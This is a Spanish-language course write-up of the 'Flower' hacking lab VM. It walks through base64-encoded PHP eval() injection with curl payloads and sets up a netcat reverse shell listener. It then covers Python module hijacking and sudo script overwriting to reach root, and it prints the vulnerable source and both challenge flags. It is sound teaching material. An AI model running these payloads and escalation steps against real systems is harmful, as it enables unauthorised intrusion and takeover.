---
title: "🖥️ Máquina: Flower — Hacking Ético"
aliases:
  - Flower
  - flower
  - Máquina Flower
  - VM Flower
  - Writeup Flower
tags:
  - ifct0109
  - hacking-etico
  - vms
  - vulnerabilidades-web
  - linux
  - ctf
---

# 🖥️ Máquina: Flower

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Vulnerabilidades Web  
> **Técnicas trabajadas:** Análisis de peticiones web (DevTools) · PHP Code Injection via eval() · Reverse Shell · Python Module Hijacking · Escalada de privilegios (sudo + script escribible)  
> **Descripción:** En esta práctica analizaremos el comportamiento de un formulario web que envía datos codificados en base64, descubriremos que el servidor los pasa directamente a eval() de PHP permitiendo inyectar código arbitrario, obtendremos una reverse shell como www-data, y escalaremos privilegios en dos pasos: primero a rose mediante Python Module Hijacking, y luego a root abusando de un script ejecutable con sudo.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.10`
* **`RHOST` (Víctima / Flower):** Ej. `10.0.0.5`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Flower tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

```bash
nmap -A -p- 10.0.0.5
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

> [!info] Resultado
> Solo el puerto 80. La web muestra un formulario para seleccionar flores. Abrimos las DevTools con F12, vamos a la pestaña Red y seleccionamos flores distintas para observar las peticiones POST que se generan.

---

## 🔬 Fase 2: Análisis del formulario — base64 y eval()

> [!info] Resultado
> Al seleccionar flores diferentes vemos que el campo petals cambia con cada selección. Los valores enviados son cadenas en base64. Los pegamos en CyberChef con la receta From Base64 y obtenemos:

```text
Lily:      MSsy  →  1+2  →  resultado: 3 pétalos
Buttercup: Misz  →  2+3  →  resultado: 5 pétalos
```

> [!info] Resultado
> El servidor decodifica el base64 y evalúa el resultado como código. Verificamos desde terminal con curl:

```bash
curl 'http://10.0.0.5/' --data-raw 'petals=MSsy' | grep ' petals '
```

```text
3 petals
```

Construimos un pequeño script que calcule el base64 y lo envíe por curl:

```bash
base64=$(echo -n '10+1' | base64) ; curl 'http://10.0.0.5/' --data-raw "petals=$base64" | grep ' petals '
```

```text
11 petals
```

> [!info] Resultado
> La operación matemática se ejecuta en el servidor. El siguiente paso es comprobar si podemos inyectar llamadas a funciones PHP arbitrarias:

```bash
base64=$(echo -n "system('id')" | base64) ; curl 'http://10.0.0.5/' --data-raw "petals=$base64" | grep ' petals '
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data) petals
```

> [!info] Resultado
> El servidor ejecutó system('id') y devolvió la salida en la respuesta. Tenemos ejecución de código remoto. Verificamos que nc está disponible para la reverse shell:

```bash
base64=$(echo -n "system('which nc')" | base64) ; curl 'http://10.0.0.5/' --data-raw "petals=$base64" | grep ' petals '
```

```text
/usr/bin/nc petals
```

---

## 🐚 Fase 3: Reverse Shell

Dividimos el terminal en horizontal. En el panel superior ponemos Kali en escucha:

```bash
nc -lnvp 9002
```

En el panel inferior lanzamos la conexión inversa:

```bash

```

```text
connect to [10.0.0.10] from (UNKNOWN) [10.0.0.5] ...
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Mejoramos la shell para tener un terminal interactivo completo:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

---

## 👤 Fase 4: Movimiento lateral — Python Module Hijacking

```bash
sudo -l
```

```text
(rose) NOPASSWD: /usr/bin/python3 /home/rose/diary/diary.py
```

> [!info] Resultado
> www-data puede ejecutar un script Python como rose. Vemos su contenido:

```bash
cat /home/rose/diary/diary.py
```

```text
import pickle
diary = {"November28":"i found a blue viola","December1":"i lost my blue viola"}
p = open('diary.pickle','wb')
pickle.dump(diary,p)
```

> [!info] Resultado
> El script importa el módulo estándar pickle. Comprobamos los permisos del directorio donde está el script:

```bash
ls -ld /home/rose/diary/
```

```text
drwxrwxrwx 2 rose rose 4096 Nov 30  2020 /home/rose/diary/
```

> [!info] Resultado
> El directorio tiene permisos de escritura para todos (rwxrwxrwx). Esto nos permite explotar el orden de búsqueda de módulos de Python.
> Cuando Python ejecuta un script, busca los módulos importados en este orden: primero en el directorio donde está el propio script, luego en las rutas de PYTHONPATH, y finalmente en los directorios estándar del sistema. Esto significa que si creamos un archivo pickle.py en /home/rose/diary/, Python lo cargará en lugar del módulo legítimo del sistema.

```bash
cd /home/rose/diary/
```

```bash
echo 'import os;os.system("/bin/bash")' > pickle.py
```

```bash
sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py
```

```text
rose@flower:~/diary$
```

```bash
id
```

```text
uid=1000(rose) gid=1000(rose) groups=1000(rose),24(cdrom)...
```

```bash
cd ~
```

```bash
ls -la
```

```bash
cat user.txt
```

```text
HMV{R0ses_are_R3d$}
```

> [!info] Resultado
> Flag de usuario obtenida: HMV{R0ses_are_R3d$}

---

## 🚀 Fase 5: Escalada de privilegios — script escribible con sudo

```bash
sudo -l
```

```text
(root) NOPASSWD: /bin/bash /home/rose/.plantbook
```

> [!info] Resultado
> rose puede ejecutar /bin/bash /home/rose/.plantbook como root. Comprobamos los permisos del archivo:

```bash
ls -l /home/rose/.plantbook
```

```text
-rwx------ 1 rose rose 120 Nov 30  2020 .plantbook
```

> [!info] Resultado
> rose es la propietaria del archivo y tiene permisos de escritura sobre él. Hacemos una copia de seguridad y lo sobreescribimos con un bash:

```bash
cp .plantbook .plantbook_backup
```

```bash
echo "/bin/bash" > .plantbook
```

```bash
sudo /bin/bash /home/rose/.plantbook
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cd /root
```

```bash
ls -la
```

```bash
cat root.txt
```

```text
HMV{R0ses_are_als0_black.}
```

> [!info] Resultado
> Flag de root obtenida: HMV{R0ses_are_als0_black.}

---

## 🧠 Análisis: PHP Code Injection via eval()

```text
<?php
    if (isset($_POST["petals"])){
        echo eval("return ".base64_decode($_POST["petals"]).";").' petals ';
    }
?>
```

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
